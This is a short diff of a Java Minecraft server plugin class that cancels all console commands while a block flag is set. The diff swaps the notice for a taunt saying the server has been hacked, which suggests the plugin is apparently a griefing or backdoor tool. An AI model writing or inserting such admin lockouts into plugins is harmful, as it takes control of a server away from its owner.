@@ -33,7 +33,7 @@ public class BlockConsoleCommand extends Command implements Listener {
 	public void onServerCommand(ServerCommandEvent e) {
 		if(isBlocked) {
 			e.setCancelled(true);
-			console.send("§cDie Konsole wurde blockiert!");
+			console.send("§cDie Konsole wurde blockiert! HAHAHHAHAHAHAHAHAhAHAhAAHAHHA SeRvEr GeT hAcKeD rOfL lOl uwu");
 		}
 	}
 }
